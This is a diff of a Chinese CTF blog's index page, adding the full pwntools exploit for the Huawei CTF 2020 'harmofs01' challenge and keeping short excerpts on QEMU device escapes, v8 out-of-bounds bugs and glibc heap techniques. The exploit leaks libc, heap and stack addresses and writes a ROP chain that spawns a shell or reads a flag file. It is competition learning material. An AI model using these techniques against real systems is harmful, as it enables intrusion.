@@ -214,13 +214,6 @@
 
               <time title="创建时间：2020-12-28 08:38:31" itemprop="dateCreated datePublished" datetime="2020-12-28T08:38:31+08:00">2020-12-28</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-26 14:08:06" itemprop="dateModified" datetime="2025-06-26T14:08:06+08:00">2025-06-26</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -243,9 +236,16 @@
 
       
           <p>在seek功能里使用了abs，可以第一次传入0x80000000，然后第二次传入0x7fffffff，即可将8offset设置为负数，改写size，实现全局读写。在本地进行调试时，发现musl libc会崩溃，用第三方musl libc也崩溃，patch掉崩溃的地方，即可在本地成功运行。</p>
-<img src="/2020/12/28/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%89%E5%9C%BA-harmofs01/1.png" class="">
+<img src="/2020/12/28/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%89%E5%9C%BA-harmofs01/1.png" class>
 <p>还需要泄露堆地址，才可以实现任意地址读写，free几个堆形成链表，然后溢出，泄露指针即可。构造内存泄露函数，泄露远程栈布局，确定ROP位置写ROP即可。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line">sh = remote(<span class="string">&#x27;124.71.139.184&#x27;</span>,<span class="number">31392</span>)</span><br><span class="line"><span class="comment">#sh = remote(&#x27;192.168.139.230&#x27;,10002)</span></span><br><span class="line"><span class="comment">#sh = remote(&#x27;127.0.0.1&#x27;,10004)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./bak.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Gift: &#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">envirom_addr = libc_base + libc.sym[<span class="string">&#x27;_environ&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;binsh_addr=&#x27;</span>,<span class="built_in">hex</span>(binsh_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;envirom_addr=&#x27;</span>,<span class="built_in">hex</span>(envirom_addr)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Gift: &#x27;</span>)</span><br><span class="line">elf_base = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x12d8</span></span><br><span class="line"><span class="comment">#0x0000178c : pop &#123;r0, lr&#125; ; bx lr</span></span><br><span class="line">pop_r0_lr = elf_base + <span class="number">0x0000178c</span></span><br><span class="line">backdoor = elf_base + <span class="number">0x1248</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;elf_base=&#x27;</span>,<span class="built_in">hex</span>(elf_base)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Sh &gt; &#x27;</span>,<span class="string">&#x27;touch&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;File size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;File name: &#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">seek</span>(<span class="params">name,mode,offset</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Sh &gt; &#x27;</span>,<span class="string">&#x27;fileop&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;File name:&#x27;</span>,name)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Operation:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Mode:&#x27;</span>,<span class="built_in">str</span>(mode))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Offset:&#x27;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">name,size,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Sh &gt; &#x27;</span>,<span class="string">&#x27;fileop&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;File name:&#x27;</span>,name)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Operation:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sleep(<span class="number">1</span>)</span><br><span class="line">   sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">name,size</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Sh &gt; &#x27;</span>,<span class="string">&#x27;fileop&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;File name:&#x27;</span>,name)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Operation:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">name</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Sh &gt; &#x27;</span>,<span class="string">&#x27;fileop&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;File name:&#x27;</span>,name)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Operation:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">   add(<span class="number">0x88</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">5</span>,<span class="number">2</span>):</span><br><span class="line">   delete(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">seek(<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>,<span class="number">0x80000000</span>)</span><br><span class="line"><span class="comment">#设置offset为-4</span></span><br><span class="line">seek(<span class="string">&#x27;1&#x27;</span>,<span class="number">1</span>,<span class="number">0x7ffffffc</span>)</span><br><span class="line"><span class="comment">#修改size,实现qua全局读写</span></span><br><span class="line">edit(<span class="string">&#x27;1&#x27;</span>,<span class="number">0x5</span>,p32(<span class="number">0x7fffffff</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">seek(<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#泄露堆地址</span></span><br><span class="line">show(<span class="string">&#x27;1&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;\xb1&#x27;</span>)</span><br><span class="line">sh.recv(<span class="number">0xb</span>)</span><br><span class="line">heap_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">base = heap_addr + <span class="number">0x24</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;heap_addr=&#x27;</span>,<span class="built_in">hex</span>(heap_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;base=&#x27;</span>,<span class="built_in">hex</span>(base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setPos</span>(<span class="params">addr</span>):</span><br><span class="line">   seek(<span class="string">&#x27;2&#x27;</span>,<span class="number">0</span>,<span class="number">0x80000000</span>)</span><br><span class="line">   offset = addr - base</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&#x27;offset=&#x27;</span>,<span class="built_in">hex</span>(offset)</span><br><span class="line">   <span class="keyword">if</span> offset &lt; <span class="number">0</span>:</span><br><span class="line">      <span class="comment">#设置offset为-4</span></span><br><span class="line">      seek(<span class="string">&#x27;2&#x27;</span>,<span class="number">1</span>,<span class="number">0x7ffffffc</span>)</span><br><span class="line">      <span class="comment">#修改size,实现全局读写</span></span><br><span class="line">      edit(<span class="string">&#x27;2&#x27;</span>,<span class="number">0x5</span>,p32(<span class="number">0xffffffff</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">      offset = <span class="number">0x100000000</span> + offset</span><br><span class="line">      seek(<span class="string">&#x27;2&#x27;</span>,<span class="number">0</span>,<span class="number">0x80000000</span>)</span><br><span class="line">      seek(<span class="string">&#x27;2&#x27;</span>,<span class="number">1</span>,offset - <span class="number">0x80000000</span>)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">      <span class="comment">#设置offset为-4</span></span><br><span class="line">      seek(<span class="string">&#x27;2&#x27;</span>,<span class="number">1</span>,<span class="number">0x7ffffffc</span>)</span><br><span class="line">      <span class="keyword">if</span> offset &gt;= <span class="number">0x80000000</span>:</span><br><span class="line">         edit(<span class="string">&#x27;2&#x27;</span>,<span class="number">0x5</span>,p32(<span class="number">0xffffffff</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">         edit(<span class="string">&#x27;2&#x27;</span>,<span class="number">0x5</span>,p32(<span class="number">0x7fffffff</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">      seek(<span class="string">&#x27;2&#x27;</span>,<span class="number">0</span>,offset)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">   setPos(addr)</span><br><span class="line">   show(<span class="string">&#x27;2&#x27;</span>,<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr,size,content</span>):</span><br><span class="line">   setPos(addr)</span><br><span class="line">   edit(<span class="string">&#x27;2&#x27;</span>,size,content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">leak(envirom_addr)</span><br><span class="line">stack_addr = u32(sh.recvuntil(<span class="string">&#x27;Sh &gt;&#x27;</span>,drop = <span class="literal">True</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">   rop_addr = stack_addr - <span class="number">0x450</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   rop_addr = stack_addr - <span class="number">0x5b8</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack_addr=&#x27;</span>,<span class="built_in">hex</span>(stack_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;rop_addr=&#x27;</span>,<span class="built_in">hex</span>(rop_addr)</span><br><span class="line">sh.sendline(<span class="string">&#x27;fileop&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;File name:&#x27;</span>,<span class="string">&#x27;ha1vk&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#搜索栈数据，确定ROP地址</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;for i in range(0,0xc,0x4):</span></span><br><span class="line"><span class="string">   leak(rop_addr - i)</span></span><br><span class="line"><span class="string">   stack_addr = u32(sh.recvuntil(&#x27;Sh &gt;&#x27;,drop = True)[-4:])</span></span><br><span class="line"><span class="string">   sh.sendline(&#x27;fileop&#x27;)</span></span><br><span class="line"><span class="string">   sh.sendlineafter(&#x27;File name:&#x27;,&#x27;ha1vk&#x27;)</span></span><br><span class="line"><span class="string">   print hex(stack_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">   write(rop_addr,<span class="number">0xc</span>,p32(pop_r0_lr) + p32(binsh_addr) + p32(system_addr))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   payload = p32(pop_r0_lr) + p32(rop_addr + <span class="number">0xc</span>) + p32(backdoor) + <span class="string">&#x27;/etc/flag\x00\n&#x27;</span></span><br><span class="line">   write(rop_addr,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/12/28/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%89%E5%9C%BA-harmofs01/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -290,13 +290,6 @@
 
               <time title="创建时间：2020-12-28 08:38:31" itemprop="dateCreated datePublished" datetime="2020-12-28T08:38:31+08:00">2020-12-28</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-26 14:11:14" itemprop="dateModified" datetime="2025-06-26T14:11:14+08:00">2025-06-26</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -321,8 +314,6 @@
           <p>在输入width时使用的是%x格式化字符串，会输入4字节内存</p>
 <img src="/2020/12/28/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%89%E5%9C%BA-honormap01/1.png" class>
 <p>而w位于h之上，那么就可以把h覆盖，从而绕过了对h的大小限制。</p>
-<img src="/2020/12/28/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%89%E5%9C%BA-honormap01/2.png" class>
-<p>修改h以后，就能进行堆溢出了，首先越界读，泄露func指针，计算程序基址，计算后门函数。然后利用越界写将func指针修改为后门函数地址。接下来调用后面函数时，由于第一个参数是这个结构体本身，而w和h不能自由控制。因此我们使用堆喷构造好堆布局，使得有两个堆正好相邻，然后利用前一个堆溢出越界写当前结构体的内容。可以通过show前一个节点，来查看是否堆喷成功。</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2020/12/28/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%89%E5%9C%BA-honormap01/#more" rel="contents">
@@ -375,13 +366,6 @@
 
               <time title="创建时间：2020-12-26 10:15:25" itemprop="dateCreated datePublished" datetime="2020-12-26T10:15:25+08:00">2020-12-26</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-26 13:39:54" itemprop="dateModified" datetime="2025-06-26T13:39:54+08:00">2025-06-26</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -406,8 +390,6 @@
           <p>登录逻辑使用的是strncmp进行hash比较</p>
 <img src="/2020/12/26/%E7%BA%B5%E6%A8%AA%E6%9D%AF2020-PowerSystem/1.png" class>
 <p>而pwd_hash的内容为</p>
-<img src="/2020/12/26/%E7%BA%B5%E6%A8%AA%E6%9D%AF2020-PowerSystem/2.png" class>
-<p>\0截断，因此只需爆破一下密码即可登录成功</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2020/12/26/%E7%BA%B5%E6%A8%AA%E6%9D%AF2020-PowerSystem/#more" rel="contents">
@@ -460,13 +442,6 @@
 
               <time title="创建时间：2020-12-25 10:30:19" itemprop="dateCreated datePublished" datetime="2020-12-25T10:30:19+08:00">2020-12-25</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-26 17:18:14" itemprop="dateModified" datetime="2025-06-26T17:18:14+08:00">2025-06-26</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -494,7 +469,6 @@
       
           <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/225443">https://www.anquanke.com/post/id/225443</a></p>
 <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>总结几道OOB类型的v8逃逸的利用方法，它们大多的利用手法都极为相似。</p>
-<h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><p>OOB即缓冲区溢出，在v8中的OOB漏洞是比较容易利用的，一般的步骤就是利用OOB修改<code>ArrayBuffer</code>的<code>backing_store</code>和<code>byteLength</code>实现任意地址读写，也可以直接<code>OOB</code>读取和修改对象的<code>MAP</code>，构造<code>addressOf</code>和<code>fakeObject</code>原语。</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2020/12/25/v8-oob/#more" rel="contents">
@@ -547,13 +521,6 @@
 
               <time title="创建时间：2020-12-24 00:03:31" itemprop="dateCreated datePublished" datetime="2020-12-24T00:03:31+08:00">2020-12-24</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-26 14:03:59" itemprop="dateModified" datetime="2025-06-26T14:03:59+08:00">2025-06-26</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -622,13 +589,6 @@
 
               <time title="创建时间：2020-12-21 08:39:04" itemprop="dateCreated datePublished" datetime="2020-12-21T08:39:04+08:00">2020-12-21</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-26 13:52:27" itemprop="dateModified" datetime="2025-06-26T13:52:27+08:00">2025-06-26</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -653,9 +613,6 @@
           <p>在设备的write函数里，存在任意地址读写，但是仅能写一次，也不能泄露</p>
 <img src="/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-fastexec/1.png" class>
 <p>可以考虑低字节写opaque，使得opaque设备对象向上移动，在内存里找到合适位置，使得opaque-&gt;execed为0，而其他字段有内容，这样，这可以利用设备的read函数，读取字段便可以泄露地址，而且由于opaque-&gt;execed为0，我们还可以再次进行任意地址写。</p>
-<img src="/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-fastexec/2.png" class>
-
-<img src="/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-fastexec/3.png" class>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-fastexec/#more" rel="contents">
@@ -708,13 +665,6 @@
 
               <time title="创建时间：2020-12-21 08:39:04" itemprop="dateCreated datePublished" datetime="2020-12-21T08:39:04+08:00">2020-12-21</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-26 13:56:28" itemprop="dateModified" datetime="2025-06-26T13:56:28+08:00">2025-06-26</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -739,9 +689,6 @@
           <p>存在一个off by one，可以多读取或写入一个字节</p>
 <img src="/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/1.png" class>
 <p>其中buf后面是设备obj指针，由于读写会用到这个指针，因此，我们可以修改obj指针的低1字节，使得phys_addr、length、pos、obj、以及cpu_physical_memory_rw函数指针等字段偏移到buf可控区里。</p>
-<img src="/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/2.png" class>
-
-<p>同时cpu_physical_memory_rw是以原来对象指针来取得，而不是从obj，因此可以通过修改后的obj的buf来写cpu_physical_memory_rw指针。</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2020/12/21/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%B8%80%E5%9C%BA-qemuzzz-1/#more" rel="contents">
@@ -794,13 +741,6 @@
 
               <time title="创建时间：2020-12-17 10:30:51" itemprop="dateCreated datePublished" datetime="2020-12-17T10:30:51+08:00">2020-12-17</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-26 17:14:41" itemprop="dateModified" datetime="2025-06-26T17:14:41+08:00">2025-06-26</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -828,7 +768,6 @@
       
           <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/224195">https://www.anquanke.com/post/id/224195</a></p>
 <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>刚开始接触v8方面的漏洞利用，就从这题分享一下我学习的过程。</p>
-<h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><h3 id="JIT"><a href="#JIT" class="headerlink" title="JIT"></a>JIT</h3>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2020/12/17/qwb2020-final-GOOexec/#more" rel="contents">
@@ -881,13 +820,6 @@
 
               <time title="创建时间：2020-12-10 14:30:02" itemprop="dateCreated datePublished" datetime="2020-12-10T14:30:02+08:00">2020-12-10</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-26 17:09:52" itemprop="dateModified" datetime="2025-06-26T17:09:52+08:00">2025-06-26</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -915,7 +847,6 @@
       
           <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/224765">https://www.anquanke.com/post/id/224765</a></p>
 <h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>从一题学习v8引擎对property access的相关JIT优化</p>
-<h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2020/12/10/RealWorldCTF-Quals-2019-accessible/#more" rel="contents">
@@ -968,13 +899,6 @@
 
               <time title="创建时间：2020-12-07 10:30:15" itemprop="dateCreated datePublished" datetime="2020-12-07T10:30:15+08:00">2020-12-07</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-26 17:06:40" itemprop="dateModified" datetime="2025-06-26T17:06:40+08:00">2025-06-26</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -1002,7 +926,6 @@
       
           <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/222948">https://www.anquanke.com/post/id/222948</a></p>
 <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>总结出的一种新型堆利用手法，适用于目前所有的glibc版本，我暂且命名它为house of banana~。</p>
-<h2 id="0x02-新版glibc的改进"><a href="#0x02-新版glibc的改进" class="headerlink" title="0x02 新版glibc的改进"></a>0x02 新版glibc的改进</h2><p>从glibc 2.28开始，_int_malloc中增加了对unsorted bin的bk的校验，使得unsorted bin attack变得不可行。</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2020/12/07/house-of-banana/#more" rel="contents">
